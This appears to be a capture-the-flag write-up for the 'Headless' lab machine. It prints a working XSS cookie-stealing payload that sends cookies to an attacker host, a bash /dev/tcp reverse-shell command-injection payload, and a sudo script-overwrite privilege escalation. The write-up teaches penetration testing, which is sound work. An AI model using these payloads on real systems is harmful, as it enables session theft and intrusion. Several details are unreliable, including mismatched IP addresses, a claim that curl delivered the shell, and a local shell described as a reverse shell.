# Headless Machine (Linux)

# nmap

22
5000

# 5000

I headed over to port 5000, we are greeted with a "Welcome to Our Website" and a button **For questions** that redirects you to a form. 

I did a quick submit of the form and we can see that form does indeed send. 
Basic rule is; when we see a form with think of XSS. 

I checked the DevTools and when I checked the Storage I saw that there a cookie available for **is_admin**. 

# feroxbuster

`feroxbuster -u http://10.10.15.7:5000`

Results:
200      GET       93l      179w     2363c http://10.10.11.8:5000/support
200      GET       96l      259w     2799c http://10.10.11.8:5000/
500      GET        5l       37w      265c http://10.10.11.8:5000/dashboard


**/dashboard** states that is an Unauthorized page; from the description also gives a hint on how we can get access.

# cookie stealer

Going back to the form and using XSS script, I pulled up Burp; keeping in mind the admin cookie.

From here we sent our page to the Repeater and added my basic XSS script into **User-Agent** and below **fname**.
`<script>document.location = "http://10.10.11.6:7777/?c=" + document.cookie;</script>`

#### **Step-by-Step Breakdown**
1. **`document.cookie`** → Gets all cookies stored for the current website.
2. **`document.location = "http://10.10.11.6:7777/?c=" + document.cookie;`**
   - Redirects the victim's browser to `http://10.10.11.6:7777/`,
   - Appends the victim's cookies as a URL parameter (`?c=...`).
   - Example: If the user's cookie is `is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs`, the URL becomes:
     ```
     http://10.10.11.6:7777/?c=is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
     ```
   - This **sends the cookie to the attacker's machine** at `10.10.14.2:7777`.

---

### **Why Inject It in User-Agent and Below fname?**
You needed to insert the script in **two places** in Burp Suite because:

#### **1. Injecting in User-Agent** (HTTP Header)
- Some web applications **log** the `User-Agent` string (browser type).
- If an **admin** views these logs in their browser **without sanitizing input**, your script **executes in their session**, stealing their cookies.
- Example: If an admin checks logs in a vulnerable **admin panel**, the script runs in **their browser**, sending their session to you.

#### **2. Injecting in fname (Form Data)**
- If the application **reflects** form inputs in the response (e.g., showing `fname` on a webpage), the script runs if the page doesn’t properly escape HTML.
- Example: If `fname` is displayed like:
  ```html
  <p>First Name: <script>document.location = "http://10.10.11.6:7777/?c=" + document.cookie;</script></p>
  ```
  - The victim's browser **sees the script as part of the page** and **executes it**.

---

### **Summary: Why Both Places?**
- **User-Agent** → Targets logs viewed by **admins or security teams**.
- **fname (Form Field)** → Targets **users** if input is displayed on a webpage.

I tested both methods to see which **vulnerability** exists in the app (Reflected or Stored XSS).

# /dashbaord

Once we got the cookie we can use the DevTools and insert the cooke in **is_admin** and then refresh the page. 

We don't get much from **/dashboard** page other then a button **Generate Report**. I clicked on it and the same as before, we can see something is being sent over and it says "
Systems are up and running!"

# BurpSuite it is (AGAIN)

Doing the same as before but this time going for a reverse shell. Why Reverse shell?
1. **Identified Command Injection**: Tested with `sleep 1` and `sleep 2` in the repeater, confirming you could delay server response, indicating command execution.
2. **Confirmed Reverse Shell Possibility**: Since command injection was possible, you could execute a reverse shell by leveraging outbound connections.
3. **Exploit with Reverse Shell**: Used `curl` to execute a reverse shell payload from your server to gain interactive access.

This process confirmed command injection and led to successfully using a reverse shell using:

### **Command Breakdown:**
```bash
date=2023-09-15; bash -c 'bash -i >%26 /dev/tcp/10.10.11.6/7777 0>%26 1'
```

1. **`date=2023-09-15;`**  
   - This part is where I assign the value `2023-09-15` to the variable `date`. This executes first before moving on to the main command.

2. **`bash -c '...'`**  
   - I use `bash -c` to execute the command inside the single quotes. It tells my system to run the string inside as a command.

3. **`bash -i`**  
   - This starts a new instance of **bash** in **interactive mode**, which is essential because it gives me a fully interactive shell.

4. **`>%26 /dev/tcp/10.10.11.6/7777`**  
   - **`>%26`** is the encoded version of `&`, which is used to separate commands in bash.
   - **`/dev/tcp/10.10.14.6/7777`** is a special device in Linux that allows me to create a **TCP connection** to `10.10.11.6` (my attacker machine) on port `7777`.

5. **`0>%26 1`**  
   - **`0>%26`**: Redirects **stdin** (input) from the attacker’s machine.
   - **`1`**: Redirects **stdout** (output) to the same TCP connection, so any command results are sent back to my machine.

### **What This Does:**
- The command **opens a TCP connection** from the target machine to my machine at IP `10.10.11.6` on port `7777`.
- Both the input (commands I send) and output (results) are handled over this network connection, allowing me to send commands to the target and receive responses.

This is how I establish a reverse shell to gain interactive access to the target system.

Once inside the shell we can look for the **user.txt** flag.

After finding the user flag. I did a quick sudo permsission that returned:
(ALL) NOPASSWD: /usr/bin/syscheck

`cat /usr/bin/syscheck`

```
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
```

Here’s what I did and why that first script was important:

1. **Understanding the Script**
   The first script checks if the **`initdb.sh`** script is already running by using `pgrep -x "initdb.sh"`. If it isn’t running, it outputs "Database service is not running. Starting it..." and then runs the `initdb.sh` script.
   - **Why it matters**: This check told me that if the service wasn’t running, I could start it. The key part for me was that this script was executing `initdb.sh`, which could be vulnerable if I could modify it.

2. **Modifying the Script**
   I realized I could inject my own commands into the `initdb.sh` script. To do this, I ran:
   ```bash
   echo "/bin/bash" > initdb.sh
   ```
   This replaced the contents of `initdb.sh` with a command that spawns a **bash shell**, which would give me a reverse shell when executed.

3. **Making the Script Executable**
   Next, I gave myself permission to execute the `initdb.sh` script by running:
   ```bash
   chmod +x initdb.sh
   ```

4. **Running `syscheck`**
   Finally, I ran the command:
   ```bash
   sudo /usr/bin/syscheck
   ```
   This triggered the execution of `initdb.sh`. Since I modified it to run `/bin/bash`, it executed my reverse shell instead of its normal function. This gave me an interactive shell on the system.

### **Why the First Script Was Important**
The first script gave me an opportunity to **control the execution of `initdb.sh`**. By checking whether it was running and starting it if not, it allowed me to **inject my own shell** into the script, which I could then execute. This was a crucial step in gaining access.

From here I ran `whoami` and got see that I got **root**. 
Simple bash commands and I got the **root.txt** flag.

PWNED!

# **Summary**
This document describes the process of exploiting a web application to gain root access on a system using XSS, command injection, and privilege escalation. Here's a breakdown:

1. **Identifying Vulnerabilities**:
   - The form on port 5000 was found to be vulnerable to **XSS**. Injecting an XSS payload allowed the attacker to steal cookies, especially the **is_admin** cookie.
   - **feroxbuster** was used to identify pages, including a vulnerable `/dashboard` page.
   - Command injection was confirmed through delay techniques, indicating the ability to run arbitrary commands on the target machine.

2. **Exploiting XSS**:
   - The attacker used XSS to inject a script into the **User-Agent** and **fname** fields, stealing cookies and redirecting them to their server.
   - The **is_admin** cookie was retrieved, and the attacker injected it into their session to gain access to restricted pages.

3. **Command Injection & Reverse Shell**:
   - After identifying command injection, the attacker used `curl` to exploit this vulnerability and trigger a reverse shell. 
   - A **reverse shell payload** was crafted and executed, establishing an interactive shell on the target system.

4. **Privilege Escalation**:
   - The attacker found a script (`/usr/bin/syscheck`) that checked if a database service was running and executed `initdb.sh`. 
   - The attacker modified `initdb.sh` to spawn a reverse shell, made it executable, and triggered it with `sudo`.
   - This granted root access, leading to the successful capture of the **root.txt** flag.

---

### **Key Takeaways**
1. **XSS for Cookie Theft**: Always test for **XSS** in form fields, as it can be used to steal sensitive data like cookies.
2. **Command Injection**: A simple test for command injection (e.g., `sleep` commands) can lead to the execution of arbitrary commands on the server.
3. **Reverse Shells**: Reverse shells allow for interactive access. You can use tools like `curl` to establish a connection between the victim machine and your attacker machine.
4. **Privilege Escalation**: **Sudo permissions** and scripts like `syscheck` can provide an opportunity to escalate privileges. Modifying scripts executed by **sudo** can lead to **root** access.

---

### **What to Remember**
- **XSS** can be used to steal cookies, including admin credentials.
- **Command injection** can open doors for remote code execution.
- Modifying scripts that run with **sudo** privileges can allow privilege escalation to **root**.
- **Testing with burp suite** and **feroxbuster** are useful for discovering vulnerabilities.
- Always ensure to check for **interactive shell access** once privileged access is obtained.
